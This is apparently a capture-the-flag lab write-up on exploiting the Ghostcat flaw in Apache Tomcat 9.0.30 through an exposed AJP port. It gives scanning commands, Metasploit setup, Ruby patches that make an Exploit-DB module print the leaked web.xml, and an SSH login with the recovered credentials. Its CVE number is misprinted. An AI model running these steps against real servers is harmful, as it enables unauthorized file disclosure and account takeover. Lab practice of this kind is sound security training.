### Find the services exposed by the machine
```BASH
nmap -sV -p- 10.10.119.52
```
![image](https://github.com/user-attachments/assets/843c0030-20f7-4aa6-9408-5b3c25261a22)

TCP port 8009 is open and running the Apache JServ Protocol (AJP) 1.3, while port 8080 is serving an Apache Tomcat 9.0.30 instance. This version of Apache Tomcat (9.0.30), when combined with an exposed AJP port is vulnerable to the [Ghostcat vulnerability - CVE-2020-193](https://www.exploit-db.com/exploits/49039)

<span style="line-height:0.5;">&nbsp;</span>

Exploit run a Metasploit module or code that depends on the Metasploit Framework, so we have to run it in Metasploit. Before moving file to directory I had to make some fixes to work. 

Copy code to new file, for exmaple `exploit.rb`. After that create new directory for custom module:
```BASH
mkdir -p ~/.msf4/modules/exploits/multi/http
```
Move  `exploit.rb` to new directory:
```BASH
mv exploit.rb ~/.msf4/modules/exploits/multi/http/ghostcat.rb
```
Run msfconsole
```BASH
msfconsole
```
Reload all scripts
```BASH
reload_all
```
Use custom module from exploit db
```BASH
use exploit/multi/http/ghostcat
```
Set parameters and run
```BASH
set RHOSTS 10.10.149.201
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```

That means the exploit successfully read the file from the remote Tomcat server via the AJP port:
![image](https://github.com/user-attachments/assets/ed1c8cf8-ae01-4e7a-af22-9cce1496c9cf)

This exploit successfully makes the AJP request, but it does not print the actual response body. Go back to directory where script sits and make few changes:
Replace this:
```RUBY
print "#{buf[idx..(idx+len)]}"
```
With:
```RUBY
content = buf[idx...(idx+len)]
print_status("File contents:\n")
print_line(content)
```
![image](https://github.com/user-attachments/assets/8bfb432d-af72-4b74-8bb0-4b29f97ef7f2)
Server responded with:
```BASH
500 Internal Server Error
Message: The requested resource [index] is not available
```
This error comes from this line in custom module.
```RUBY
{"req_attribute" => ["javax.servlet.include.request_uri", "index"]},
```
Go back to directory where script sits and make some more changes:
Replace this:
```RUBY
attributes = [
    {"req_attribute" => ["javax.servlet.include.request_uri", "index"]},
    {"req_attribute" => ["javax.servlet.include.path_info" , target_file]},
    {"req_attribute" => ["javax.servlet.include.servlet_path" , "/"]}
]
```
With this:
```RUBY
attributes = [
    {"req_attribute" => ["javax.servlet.include.request_uri", "/"]},
    {"req_attribute" => ["javax.servlet.include.path_info" , target_file]},
    {"req_attribute" => ["javax.servlet.include.servlet_path" , "/"]}
]
```

Go back to msfconsole. Set parameters and run
```BASH
set RHOSTS 10.10.149.201
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```
From the response you can see that ceredentails are `skyfuck:8730281lkjlkjdqlksalks`
![image](https://github.com/user-attachments/assets/9d9d8391-1e8e-4079-96d3-beb9665c44c7)
![image](https://github.com/user-attachments/assets/1ee42b3a-bb7d-4f8a-9639-c016b6204ade)

SSH to skyfuck account.
```BASH
ssh skyfuck@10.10.149.201
```
![image](https://github.com/user-attachments/assets/b3d3f0ca-4b05-4925-bd46-1ca9a8458e55)



